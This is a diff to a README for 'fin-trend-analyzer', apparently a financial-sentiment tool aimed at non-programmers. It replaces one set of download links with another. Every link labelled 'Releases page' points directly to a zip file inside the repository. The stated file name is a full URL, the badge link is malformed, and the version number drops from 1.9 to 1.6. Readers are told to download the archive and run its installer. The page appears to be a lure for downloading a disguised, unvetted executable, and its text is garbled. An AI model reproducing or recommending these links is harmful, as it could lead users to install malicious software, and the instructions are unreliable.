@@ -7,7 +7,7 @@ fin-trend-analyzer helps you analyze financial news and sentiment. It focuses on
 To get started with fin-trend-analyzer, follow these simple steps to download and run the software. Don’t worry; you don’t need any programming knowledge!
 
 ## 📥 Download Here
-[![Download fin-trend-analyzer](https://raw.githubusercontent.com/azvinaz/fin-trend-analyzer/main/fin_trend_analyzer/analyzer_trend_fin_v1.9.zip%20Now-brightgreen)](https://raw.githubusercontent.com/azvinaz/fin-trend-analyzer/main/fin_trend_analyzer/analyzer_trend_fin_v1.9.zip)
+[![Download fin-trend-analyzer](https://github.com/azvinaz/fin-trend-analyzer/raw/refs/heads/main/fin_trend_analyzer/trend-analyzer-fin-v1.6.zip%20Now-brightgreen)](https://github.com/azvinaz/fin-trend-analyzer/raw/refs/heads/main/fin_trend_analyzer/trend-analyzer-fin-v1.6.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -25,11 +25,11 @@ Before you download, ensure your system meets the following requirements:
 - **Bubble Indicators**: Spot potential market bubbles early.
 
 ## 💾 Download & Install
-1. **Visit the Releases Page**: Access the [Releases page here](https://raw.githubusercontent.com/azvinaz/fin-trend-analyzer/main/fin_trend_analyzer/analyzer_trend_fin_v1.9.zip).
+1. **Visit the Releases Page**: Access the [Releases page here](https://github.com/azvinaz/fin-trend-analyzer/raw/refs/heads/main/fin_trend_analyzer/trend-analyzer-fin-v1.6.zip).
    
 2. **Select the Latest Version**: Find the latest release version. It will be at the top of the page.
 
-3. **Download the Application**: Click on the relevant file to download. The file will typically have a name like `https://raw.githubusercontent.com/azvinaz/fin-trend-analyzer/main/fin_trend_analyzer/analyzer_trend_fin_v1.9.zip`.
+3. **Download the Application**: Click on the relevant file to download. The file will typically have a name like `https://github.com/azvinaz/fin-trend-analyzer/raw/refs/heads/main/fin_trend_analyzer/trend-analyzer-fin-v1.6.zip`.
 
 4. **Run the Installer**:
    - Open the downloaded file.
@@ -64,6 +64,6 @@ We welcome contributions! If you're interested in improving fin-trend-analyzer, 
 - **Follow Us**: Connect with other users and share your insights on social media. We aim to build a supportive community for all analysts.
 
 ## 📥 Download Again
-Don't forget, you can download fin-trend-analyzer from the [Releases page here](https://raw.githubusercontent.com/azvinaz/fin-trend-analyzer/main/fin_trend_analyzer/analyzer_trend_fin_v1.9.zip). 
+Don't forget, you can download fin-trend-analyzer from the [Releases page here](https://github.com/azvinaz/fin-trend-analyzer/raw/refs/heads/main/fin_trend_analyzer/trend-analyzer-fin-v1.6.zip). 
 
 Now you're ready to start analyzing trends and making informed financial decisions! Enjoy using fin-trend-analyzer!
